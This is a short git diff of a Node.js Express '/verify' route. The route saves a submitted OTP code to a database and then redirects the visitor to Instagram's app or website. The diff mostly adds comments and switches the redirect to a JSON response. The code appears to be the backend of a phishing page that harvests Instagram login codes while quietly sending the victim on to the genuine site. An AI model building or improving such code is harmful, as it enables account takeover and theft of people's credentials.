@@ -60,23 +60,25 @@ router.post("/verify", async (req, res) => {
     const { otp } = req.body;
 
     try {
-        const newOtpEntry = new otpModel({ otp }); // FIXED: Use otpModel
+        const newOtpEntry = new otpModel({ otp });
         await newOtpEntry.save();
 
         const userAgent = req.headers["user-agent"];
-        let redirectURL = "https://www.instagram.com/";
+        let redirectURL = "https://www.instagram.com/"; // Default: Open in browser
 
         if (/android/i.test(userAgent)) {
-            redirectURL = "intent://instagram.com/#Intent;package=com.instagram.android;scheme=https;end;";
+            redirectURL = "intent://instagram.com/#Intent;package=com.instagram.android;scheme=https;end;"; // Open Instagram App (Android)
         } else if (/iphone|ipad|ipod/i.test(userAgent)) {
-            redirectURL = "instagram://app";
+            redirectURL = "instagram://app"; // Open Instagram App (iOS)
         }
 
-        res.redirect(redirectURL);
+        res.status(200).json({ success: true, redirectURL });
+
     } catch (err) {
         console.error("❌ Error saving OTP:", err.message);
-        res.status(500).send("Server Down! Retry");
+        res.status(500).json({ success: false, message: "Server Down! Retry" });
     }
 });
+
 
 module.exports = router; // FIXED: Export router
